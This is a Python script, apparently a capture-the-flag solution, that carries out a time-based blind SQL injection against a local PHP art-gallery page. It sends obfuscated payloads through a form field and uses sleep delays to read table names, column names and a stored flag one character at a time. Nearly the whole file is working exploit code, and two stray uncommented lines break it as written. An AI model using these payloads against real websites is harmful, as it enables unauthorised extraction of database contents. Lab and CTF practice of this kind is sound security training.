import requests as r

url = 'http://localhost/art_gallery/home.php'
cookie={'PHPSESSID':'qugdljuno21tl7pennd1gt8s0j'}

table length extraction
print('Starting length extraction: \r\n')
for i in range(1,20):
    #print(' currentlength '+str(i))
    payload='1,(select/**/if(((select/**/length(group_concat(table_name))/**/from/**/information_schema.tables/**/where/**/table_schema=database())='+str(i)+'),NULL,sleep(0.5)))'
    res = r.post(url,cookies=cookie,data={'filters':payload})
    if(res.elapsed.total_seconds()<3.00):
        tabllength = i
        print('Length of the tables concatenated:'+str(i))
        #print(res.text)
        break

table name extraction
print('starting name extraction: \r\n')
tablename=''
for i in range(1,tabllength+1):
    for j in range(97,122):
        #print(str(i)+' '+chr(j))
        payload='1,(select/**/if((substring((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()),'+str(i)+',1)=unhex(hex('+str(j)+'))),NULL,sleep(0.5)));'
        res = r.post(url,cookies=cookie,data={'filters':payload})
        if(res.elapsed.total_seconds()<3.00):
            tablename = tablename+chr(j)
            break
print(tablename)

print('starting column length extraction: \r\n')
for i in range(10,25):
    #print('curr column length: '+str(i))
    payload='1,(select/**/if(((select/**/length(group_concat(column_name))/**/from/**/information_schema.columns/**/where/**/table_name=(concat(lower(conv(25,10,36)),lower(conv(27,10,36)),lower(conv(24,10,36)),lower(conv(13,10,36)),lower(conv(30,10,36)),lower(conv(12,10,36)),lower(conv(29,10,36)),lower(conv(28,10,36)))))='+str(i)+'),NULL,sleep(2)));'
    res = r.post(url,cookies=cookie,data={'filters':payload})
    if(res.elapsed.total_seconds()<3.00):
        collength = i
        print('Length of the columns concatenated: '+str(i))
        #print(res.text)
        break

print('starting column names extraction: ')
colname=''
for i in range(1,collength+1):
    for j in range(97,122):
        #print(str(i)+' '+chr(j))
        payload='1,(select/**/if(((substring((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=(concat(lower(conv(25,10,36)),lower(conv(27,10,36)),lower(conv(24,10,36)),lower(conv(13,10,36)),lower(conv(30,10,36)),lower(conv(12,10,36)),lower(conv(29,10,36)),lower(conv(28,10,36))))),'+str(i)+',1))=unhex(hex('+str(j)+'))),NULL,sleep(2)))'
        res = r.post(url,cookies=cookie,data={'filters':payload})
        if(res.elapsed.total_seconds()<3.00):
            colname = colname+chr(j)
            break
print('concatenated column names: '+ colname)

print('Starting to extract flag length: ')
for i in range(30,50):
    #print('curr flag length: '+str(i))
    payload = '1,(select/**/if((length((select/**/name/**/from/**/products/**/where/**/exclusive=1))='+str(i)+'),NULL,sleep(1)));'
    res = r.post(url,cookies=cookie,data={'filters':payload})
    if(res.elapsed.total_seconds()<3.00):
        flaglength = i
        print('Length of the flag: '+str(i))
        #print(res.text)
        break
print('starting to extract flag: ')
flag=''
for i in range(1,flaglength+1) :
    for j in range(48,125):
        #print(str(i)+' '+chr(j))
        payload='1,(select/**/if((substring((select/**/name/**/from/**/products/**/where/**/exclusive=1),'+str(i)+',1)=unhex(hex('+str(j)+'))),NULL,sleep(1)));'
        res = r.post(url,cookies=cookie,data={'filters':payload})
        if(res.elapsed.total_seconds()<3.00):
            flag = flag+chr(j)
            break
print('Flag: '+ flag)
